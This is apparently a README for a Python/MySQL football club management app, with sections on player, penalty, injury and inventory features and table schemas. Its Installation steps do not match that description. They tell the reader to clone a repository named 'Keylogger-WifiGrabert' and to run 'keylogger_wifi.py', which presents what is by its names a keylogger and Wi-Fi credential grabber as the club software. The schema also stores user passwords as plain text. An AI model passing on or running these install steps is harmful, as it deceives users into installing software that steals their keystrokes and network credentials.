#  Football Club Management System  

This **Football Club Management System** is a Python-based application that helps manage football club operations, including **team management, medical records, and inventory tracking**. The system utilizes **MySQL** for data storage and employs the **Tabulate** library for better data visualization in the terminal.

## Features  
###  Team Management  
- **Add Players**: Register new players with name, age, position, and salary.  
- **Remove Players**: Delete players from the database.  
- **View Player Info**: Fetch and display details of a player.  
- **Increase Salary**: Update player salaries.  
- **Penalties Management**:  
  - View penalized players (Yellow/Red cards).  
  - Assign penalties (Yellow/Red cards).  
  - Remove penalties.  

###  Medical Management  
- **Add Injury**: Assign injuries to players from a predefined list.  
- **View Injuries**: Display all injured players.  
- **Treat Injuries**: Mark a player as treated and assign recovery time.  
- **Recover Player**: Clear injury status after treatment completion.  

###  Inventory Management  
- **View Stock**: Check available stock of kits, footballs, and shoes.  
- **Add Stock**: Increase the quantity of available items.  
- **Reduce Stock**: Decrease the quantity of available items.  

---

## 👤 User Roles  
- **Manager**: Handles **team management** and **penalties**.  
- **Medic**: Manages **player injuries and treatments**.  
- **Sales Staff**: Takes care of **inventory management**.  

---

## 🛠️ Requirements  
- Python 3.8 or later  
- MySQL Server
 ```sql
CREATE TABLE players (Name VARCHAR(50) PRIMARY KEY, Age INT, Position VARCHAR(10), Salary INT);
CREATE TABLE injured (Name VARCHAR(50), Age INT, Position VARCHAR(10), Injury VARCHAR(50), Treated VARCHAR(5), `Time Till Healed` VARCHAR(20));
CREATE TABLE penalties (Name VARCHAR(50), Age INT, Position VARCHAR(10), Cards VARCHAR(10));
CREATE TABLE sales (Item VARCHAR(50), Stock INT);
CREATE TABLE users (Username VARCHAR(50), Password VARCHAR(50));
```
- Required Python libraries:  
  ```sh
  pip install mysql-connector-python tabulate



# Installation
1. Clone the repository
 `git clone https://github.com/Codexx121/Keylogger-WifiGrabert.git`

 - **Install Dependencies if not yet installed**
 `  pip install mysql-connector-python tabulate`

2. Run using python
   `python keylogger_wifi.py`
   
